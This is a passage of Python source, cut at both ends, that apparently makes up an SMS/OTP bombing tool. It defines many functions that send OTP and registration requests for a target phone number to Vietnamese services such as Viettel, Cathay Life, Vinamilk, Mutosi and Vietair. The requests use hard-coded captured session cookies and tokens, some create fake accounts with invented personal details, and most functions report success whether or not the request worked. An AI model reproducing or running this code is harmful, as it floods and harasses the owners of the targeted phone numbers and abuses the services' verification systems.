        # 'Cookie': 'redirectLogin=https://viettel.vn/myviettel; laravel_session=qCs3S11kNAldWtLh8UYFGYbq6YicwmeargiwDoFy; XSRF-TOKEN=eyJpdiI6IlRrek5qTnc0cjBqM2VYeTRrVUhkZlE9PSIsInZhbHVlIjoiWmNxeVBNZ09nSHQ1MUcwN2JoaWY0TFZKU0RzbVRVNHdkSnlPZlJCTnQ2akhkNjIxZ21pWG9tZnVyNDZzZmlvTyIsIm1hYyI6IjJlZmZhZGI4ZTRjZjQ5NDIyYWFjNTY1ZjYzMzI2OTYzZTE5OTc2ZDBjZmU1MTgyMmFmMjYwNWZkM2UwNzYwMDAifQ%3D%3D',
        'DNT': '1',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/myviettel',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'X-CSRF-TOKEN': 'PCRPIvstcYaGt1K9tSEwTQWaTADrAS8vADc3KGN7',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6IlRrek5qTnc0cjBqM2VYeTRrVUhkZlE9PSIsInZhbHVlIjoiWmNxeVBNZ09nSHQ1MUcwN2JoaWY0TFZKU0RzbVRVNHdkSnlPZlJCTnQ2akhkNjIxZ21pWG9tZnVyNDZzZmlvTyIsIm1hYyI6IjJlZmZhZGI4ZTRjZjQ5NDIyYWFjNTY1ZjYzMzI2OTYzZTE5OTc2ZDBjZmU1MTgyMmFmMjYwNWZkM2UwNzYwMDAifQ==',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': sdt,
        'type': 'register',
    }

    response = requests.post('https://viettel.vn/api/get-otp-contract-mobile', headers=headers, json=json_data)
    print('thành Công') #("OTP SEND myviettel 2:", response.text)

def send_otp_via_myviettel3(sdt):
    cookies = {
        'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
        'redirectLogin': 'https://viettel.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': sdt,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data)

def send_otp_via_TOKYOLIFE(sdt):

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://tokyolife.vn',
        'priority': 'u=1, i',
        'referer': 'https://tokyolife.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'signature': 'c5b0d82fae6baaced6c7f383498dfeb5',
        'timestamp': '1722427632213',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_data = {
        'phone_number': sdt,
        'name': 'Nguyễn Quang Ngọc',
        'password': 'pUL3.GFSd4MWYXp',
        'email': 'reggg10tb@gmail.com',
        'birthday': '2002-03-12',
        'gender': 'male',
    }

    response = requests.post('https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register', headers=headers, json=json_data)
    print('thành Công') #("OTP SEND TOKYOLIFE:", response.text)


def send_otp_via_30shine(sdt):

    headers = {
        'accept': 'application/json',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'authorization': '',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://30shine.com',
        'priority': 'u=1, i',
        'referer': 'https://30shine.com/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_data = {
        'phone': sdt,
    }

    response = requests.post(
        'https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send',
        headers=headers,
        json=json_data,
    )
    print('thành Công') #("OTP SEND 30shine:", response.text)


def send_otp_via_Cathaylife(sdt):
    cookies = {
        'JSESSIONID': 'ZbYymlmg5m-a2C3zpbQd4SV7.06283f0e-f7d1-36ef-bc27-6779aba32e74',
        'TS01f67c5d': '0110512fd7eb22da3339fa3fbb5e9465d2ef5c0648aaabeeceb4d6600a1b6a8d437905e3288d3b293c9d9c4b7822fdf368f14de57e',
        'BIGipServerB2C_http': '!8gwNGHCkHttqM67RrhDcHTnwa9KJ8co1rTJtwxa4VlraYj9EKcpm2F5VRwfO1cjdua8ssBafXSDY',
        'INITSESSIONID': '17a2a67911c35286a1001df0ae265f0d',
        'TS0173f952': '0110512fd7c0a5b00de3f3a69c4bb3fc1c29da110652a5c2f067974b704eb4fa34ea6db340c1bd0c188cb46e806add52b4c6094bc5',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-GB;q=0.8,en;q=0.7,fr-FR;q=0.6,fr;q=0.5,en-US;q=0.4',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://www.cathaylife.com.vn',
        'Referer': 'https://www.cathaylife.com.vn/CPWeb/html/CP/Z1/CPZ1_0100/CPZ10110.html',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }

    data = {
        'memberMap': f'{{"userName":"heovi823n@gmail.com","password":"ayayayayay11","birthday":"16/08/1996","certificateNumber":"034202008372","phone":"{sdt}","email":"heovinh08@gmail.com","LINK_FROM":"signUp2","memberID":"","CUSTOMER_NAME":"Nguyễn Quang Ngọc"}}',
        'OTP_TYPE': 'P',
        'LANGS': 'vi_VN',
    }

    try:
        response = requests.post(
            'https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/reSendOTP',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        response.raise_for_status()  # Kiểm tra xem có lỗi HTTP nào không
        print("OTP SEND Cathay life:", response.text)
    except requests.exceptions.HTTPError as http_err:
        print(f'HTTP error occurred: {http_err}')  # Xử lý lỗi HTTP cụ thể
    except Exception as err:
        print(f'Other error occurred: {err}')  # Xử lý các lỗi khác




def send_otp_via_vinamilk(sdt):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'authorization': 'Bearer null',
        'content-type': 'text/plain;charset=UTF-8',
        'dnt': '1',
        'origin': 'https://new.vinamilk.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://new.vinamilk.com.vn/account/register',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    data = f'{{"type":"register","phone":"{sdt}"}}'

    response = requests.post('https://new.vinamilk.com.vn/api/account/getotp', headers=headers, data=data)
    print('thành Công') #("OTP SEND vinamilk:", response.text)


def send_otp_via_vietloan2(sdt):
    cookies = {
    '_fbp': 'fb.1.1720102725444.358598086701375218',
    '_gcl_au': '1.1.619229570.1720102726',
    'mousestats_vi': 'acaa606972ae539932c0',
    '_tt_enable_cookie': '1',
    '_ttp': 'tGf0fClVBAWb7n4wsYwyYbdPx5W',
    '_ym_uid': '1720102728534641572',
    '_ym_d': '1720102728',
    '_gid': 'GA1.2.557208002.1720622172',
    '_clck': '14x7a16%7C2%7Cfnc%7C0%7C1646',
    '_ym_isad': '2',
    '__cfruid': '92805d7d62cc6333c3436c959ecc099040706b4f-1720628273',
    '_ym_visorc': 'w',
    'XSRF-TOKEN': 'eyJpdiI6IjJUcUxmYUFZY3ZGR3hFVFFGS2QybkE9PSIsInZhbHVlIjoidWVYSDZTZmVKOWZ0MFVrQnJ0VHFMOUZEdkcvUXZtQzBsTUhPRXg2Z0FWejV0U3grbzVHUUl6TG13Z09PWjhMQURWN0pkRFl4bzI3Nm9nQTdFUm5HTjN2TFd2NkExTlQ5RjUwZ1hGZEpDaUFDUTkxRVpwRzdTdWhoVElNRVYvbzgiLCJtYWMiOiI0ZTU0MWY5ZDI2NGI3MmU3ZGQwMDIzMjNiYjJjZDUyZjIzNjdkZjc0ODFhNWVkMTdhZWQ0NTJiNDgxY2ZkMDczIiwidGFnIjoiIn0%3D',
    'sessionid': 'eyJpdiI6InBWUDRIMVE1bUNtTk5CN0htRk4yQVE9PSIsInZhbHVlIjoiMGJwSU1VOER4ZnNlSCt1L0Vjckp0akliMWZYd1lXaU01K08ybXRYOWtpb2theFdzSzBENnVzWUdmczFQNzN1YU53Uk1hUk1lZWVYM25sQ0ZwbytEQldGcCthdUR4S29sVHI3SVRKcEZHRndobTlKcWx2QVlCejJPclc1dkU1bmciLCJtYWMiOiJiOTliN2NkNmY5ZDFkNTZlN2VhODg3NWIxMmEzZmVlNzRmZjU1ZGFmZWYxMzI0ZWYwNDNmMWZmMDljNmMzZDdhIiwidGFnIjoiIn0%3D',
    'utm_uid': 'eyJpdiI6IlFPQ2UydEhQbC8zbms5ZER4M2t5WWc9PSIsInZhbHVlIjoiaWlBdVppVG9QRjhEeVJDRmhYUGUvRWpMMzNpZHhTY1czTWptMDYvK2VERVFhYzFEaDV1clJBczZ2VzlOSW1YR3dVMDRRUHNYQkMvYWRndS9Kekl5KzhlNU1Xblk5NHVjdmZEcjRKNVE5RXI3cnp0MzJSd3hOVVYyTHNMMDZuT0UiLCJtYWMiOiIyOGVmNGM1NmIyZmZlNTMzZmI5OWIxYzI2NjI3Yzg2Yjg0YTAwODMxMjlkMDE0ZTU3MjVmZTViMjc5MDM1YTE4IiwidGFnIjoiIn0%3D',
    '_ga': 'GA1.2.1882430469.1720102726',
    'ec_png_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'ec_png_client': 'false',
    'ec_png_client_utm': 'null',
    'ec_cache_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'ec_cache_client': 'false',
    'ec_cache_client_utm': 'null',
    'ec_etag_client': 'false',
    'ec_etag_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'ec_etag_client_utm': 'null',
    '_clsk': '1kt5hyl%7C1720628299918%7C2%7C1%7Cx.clarity.ms%2Fcollect',
    '_ga_EBK41LH7H5': 'GS1.1.1720622171.4.1.1720628300.41.0.0',
    'uid': '12044e63-ea79-83c1-269a-86ba3fc88165',
    'client': 'false',
    'client_utm': 'null',
    }

    headers = {
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_fbp=fb.1.1720102725444.358598086701375218; _gcl_au=1.1.619229570.1720102726; mousestats_vi=acaa606972ae539932c0; _tt_enable_cookie=1; _ttp=tGf0fClVBAWb7n4wsYwyYbdPx5W; _ym_uid=1720102728534641572; _ym_d=1720102728; _gid=GA1.2.557208002.1720622172; _clck=14x7a16%7C2%7Cfnc%7C0%7C1646; _ym_isad=2; __cfruid=92805d7d62cc6333c3436c959ecc099040706b4f-1720628273; _ym_visorc=w; XSRF-TOKEN=eyJpdiI6IjJUcUxmYUFZY3ZGR3hFVFFGS2QybkE9PSIsInZhbHVlIjoidWVYSDZTZmVKOWZ0MFVrQnJ0VHFMOUZEdkcvUXZtQzBsTUhPRXg2Z0FWejV0U3grbzVHUUl6TG13Z09PWjhMQURWN0pkRFl4bzI3Nm9nQTdFUm5HTjN2TFd2NkExTlQ5RjUwZ1hGZEpDaUFDUTkxRVpwRzdTdWhoVElNRVYvbzgiLCJtYWMiOiI0ZTU0MWY5ZDI2NGI3MmU3ZGQwMDIzMjNiYjJjZDUyZjIzNjdkZjc0ODFhNWVkMTdhZWQ0NTJiNDgxY2ZkMDczIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6InBWUDRIMVE1bUNtTk5CN0htRk4yQVE9PSIsInZhbHVlIjoiMGJwSU1VOER4ZnNlSCt1L0Vjckp0akliMWZYd1lXaU01K08ybXRYOWtpb2theFdzSzBENnVzWUdmczFQNzN1YU53Uk1hUk1lZWVYM25sQ0ZwbytEQldGcCthdUR4S29sVHI3SVRKcEZHRndobTlKcWx2QVlCejJPclc1dkU1bmciLCJtYWMiOiJiOTliN2NkNmY5ZDFkNTZlN2VhODg3NWIxMmEzZmVlNzRmZjU1ZGFmZWYxMzI0ZWYwNDNmMWZmMDljNmMzZDdhIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IlFPQ2UydEhQbC8zbms5ZER4M2t5WWc9PSIsInZhbHVlIjoiaWlBdVppVG9QRjhEeVJDRmhYUGUvRWpMMzNpZHhTY1czTWptMDYvK2VERVFhYzFEaDV1clJBczZ2VzlOSW1YR3dVMDRRUHNYQkMvYWRndS9Kekl5KzhlNU1Xblk5NHVjdmZEcjRKNVE5RXI3cnp0MzJSd3hOVVYyTHNMMDZuT0UiLCJtYWMiOiIyOGVmNGM1NmIyZmZlNTMzZmI5OWIxYzI2NjI3Yzg2Yjg0YTAwODMxMjlkMDE0ZTU3MjVmZTViMjc5MDM1YTE4IiwidGFnIjoiIn0%3D; _ga=GA1.2.1882430469.1720102726; ec_png_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_png_client=false; ec_png_client_utm=null; ec_cache_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_cache_client=false; ec_cache_client_utm=null; ec_etag_client=false; ec_etag_utm=12044e63-ea79-83c1-269a-86ba3fc88165; ec_etag_client_utm=null; _clsk=1kt5hyl%7C1720628299918%7C2%7C1%7Cx.clarity.ms%2Fcollect; _ga_EBK41LH7H5=GS1.1.1720622171.4.1.1720628300.41.0.0; uid=12044e63-ea79-83c1-269a-86ba3fc88165; client=false; client_utm=null',
    'origin': 'https://vietloan.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://vietloan.vn/register',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    }

    data = {
    'phone': sdt,
    '_token': '0fgGIpezZElNb6On3gIr9jwFGxdY64YGrF8bAeNU',
    }

    response = requests.post('https://vietloan.vn/register/phone-resend', cookies=cookies, headers=headers, data=data)

def send_otp_via_batdongsan(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        # 'cookie': 'con.unl.lat=1722272400; con.unl.sc=1; g_state={"i_p":1722365115669,"i_l":1}; con.unl.usr.id=%7B%22key%22%3A%22userId%22%2C%22value%22%3A%222f8373e2-be24-412f-8c43-163568d0f3d4%22%2C%22expireDate%22%3A%222025-07-30T23%3A45%3A15.4546279Z%22%7D; con.unl.cli.id=%7B%22key%22%3A%22clientId%22%2C%22value%22%3A%22d0efffb9-6e29-4b3f-8d35-077a9bd5edbe%22%2C%22expireDate%22%3A%222025-07-30T23%3A45%3A15.4547012Z%22%7D; ab.storage.deviceId.2dca22f5-7d0d-4b29-a49e-f61ef2edc6e9=%7B%22g%22%3A%22d0d2a10b-fa24-7e47-5a09-26e1aadf8015%22%2C%22c%22%3A1722357926566%2C%22l%22%3A1722357926566%7D; _cfuvid=gviR7OYgIOmdyT7s0ARpMy95ecrZEcqyEJQQ8ON1j0A-1722438792768-0.0.1.1-604800000; cf_clearance=8kuq88Bui2ZQp3xMbu6IS8E_J6DRNIzlj.i84sS9eec-1722439989-1.0.1.1-MDtjaMwRII2EZ70WMiAg_w5s4z1uVtSRFE84bQHiHWH6mqpBKpxBqfDTc4i5Q4nxWcK8FLxgtbBzpbuIwQW2gA',
        'dnt': '1',
        'priority': 'u=1, i',
        'referer': 'https://batdongsan.com.vn/sellernet/internal-sign-up',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    params = {
        'phoneNumber': sdt,
    }

    response = requests.get(
        'https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister',
        params=params,
        headers=headers,
    )
    print('thành Công') #("OTP SEND batdongsan:", response.text)



def send_otp_via_GUMAC(sdt):
    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'DNT': '1',
        'Origin': 'https://gumac.vn',
        'Referer': 'https://gumac.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': sdt,
    }

    response = requests.post('https://cms.gumac.vn/api/v1/customers/verify-phone-number', headers=headers, json=json_data)
    print('thành Công') #("OTP SEND GUMAC:", response.text)



def send_otp_via_mutosi(sdt):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://mutosi.com',
        'Pragma': 'no-cache',
        'Referer': 'https://mutosi.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'name': 'hà khải',
        'phone': sdt,
        'password': 'Vjyy1234@',
        'confirm_password': 'Vjyy1234@',
        'firstname': None,
        'lastname': None,
        'verify_otp': 0,
        'store_token': '226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
        'email': 'dđ@gmail.com',
        'birthday': '2006-02-13',
        'accept_the_terms': 1,
        'receive_promotion': 1,
    }

    try:
        response = requests.post('https://api-omni.mutosi.com/client/auth/register', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an error for bad HTTP status codes
        print('thành Công') #("Register Response: send_otp_via_mutosi", response.json())  # print('thành Công') # the JSON response
    except requests.exceptions.RequestException as e:
        print('thành Công') #(f"An error occurred while registering: {e}")

def send_otp_via_mutosi1(sdt):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://mutosi.com',
        'Pragma': 'no-cache',
        'Referer': 'https://mutosi.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': sdt,
        'token': '03AFcWeA4O6j16gs8gKD9Zvb-gkvoC-kBTVH1xtMZrMmjfODRDkXlTkAzqS6z0cT_96PI4W-sLoELf2xrLnCpN0YvCs3q90pa8Hq52u2dIqknP5o7ZY-5isVxiouDyBbtPsQEzaVdXm0KXmAYPn0K-wy1rKYSAQWm96AVyKwsoAlFoWpgFeTHt_-J8cGBmpWcVcmOPg-D4-EirZ5J1cAGs6UtmKW9PkVZRHHwqX-tIv59digmt-KuxGcytzrCiuGqv6Rk8H52tiVzyNTtQRg6JmLpxe7VCfXEqJarPiR15tcxoo1RamCtFMkwesLd39wHBDHxoyiUah0P4NLbqHU1KYISeKbGiuZKB2baetxWItDkfZ5RCWIt5vcXXeF0TF7EkTQt635L7r1wc4O4p1I-vwapHFcBoWSStMOdjQPIokkGGo9EE-APAfAtWQjZXc4H7W3Aaj0mTLpRpZBV0TE9BssughbVXkj5JtekaSOrjrqnU0tKeNOnGv25iCg11IplsxBSr846YvJxIJqhTvoY6qbpFZymJgFe53vwtJhRktA3jGEkCFRdpFmtw6IMbfgaFxGsrMb2wkl6armSvVyxx9YKRYkwNCezXzRghV8ZtLHzKwbFgA6ESFRoIHwDIRuup4Da2Bxq4f2351XamwzEQnha6ekDE2GJbTw',
        'source': 'web_consumers',
    }

    try:
        response = requests.post('https://api-omni.mutosi.com/client/auth/reset-password/send-phone', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an error for bad HTTP status codes
        print('thành Công') #("OTP Response send_otp_via_mutosi:", response.json())  # print('thành Công') # the JSON response
    except requests.exceptions.RequestException as e:
        print('thành Công') #(f"An error occurred while sending OTP: {e}")






def send_otp_via_vietair(sdt):
    referer_url = f'https://vietair.com.vn/khach-hang-than-quen/xac-nhan-otp-dang-ky?sq_id=30149&mobile={sdt}'
    
    cookies = {
        '_gcl_au': '1.1.515899722.1720625176',
        '_tt_enable_cookie': '1',
        '_ttp': 't-FL-whNfDCNGHd27aF7syOqRSh',
        '_fbp': 'fb.2.1720625180842.882992170348492798',
        '__zi': '3000.SSZzejyD3jSkdkgYo5SCqJ6U_wE7LLZFVv3duDj7Kj1jqlNsoWH8boBGzBYF0KELBTUwk8y31v8gtBUuYWuBa0.1',
        '_gid': 'GA1.3.1511312052.1721112193',
        '_clck': '1eg7brl%7C2%7Cfni%7C0%7C1652',
        '_ga': 'GA1.1.186819165.1720625180',
        '_ga_R4WM78RL0C': 'GS1.1.1721112192.2.1.1721112216.36.0.0',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://vietair.com.vn',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': referer_url,
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'op': 'PACKAGE_HTTP_POST',
        'path_ajax_post': '/service03/sms/get',
        'package_name': 'PK_FD_SMS_OTP',
        'object_name': 'INS',
        'P_MOBILE': sdt,
        'P_TYPE_ACTIVE_CODE': 'DANG_KY_NHAN_OTP',
    }

    try:
        response = requests.post('https://vietair.com.vn/Handler/CoreHandler.ashx', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an error for bad HTTP status codes
        print('thành Công') #("Response send_otp_via_vietair(sdt):", response.json())  # print('thành Công') # the JSON response
    except requests.exceptions.RequestException as e:
        print('thành Công') #(f"An error occurred: {e}")



def send_otp_via_FAHASA(sdt):
    cookies = {
        'frontend': '173c6828799e499e81cd64a949e2c73a',
        'frontend_cid': '7bCDwdDzwf8wpQKE',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'frontend=173c6828799e499e81cd64a949e2c73a; frontend_cid=7bCDwdDzwf8wpQKE',
        'dnt': '1',
        'origin': 'https://www.fahasa.com',
        'priority': 'u=1, i',
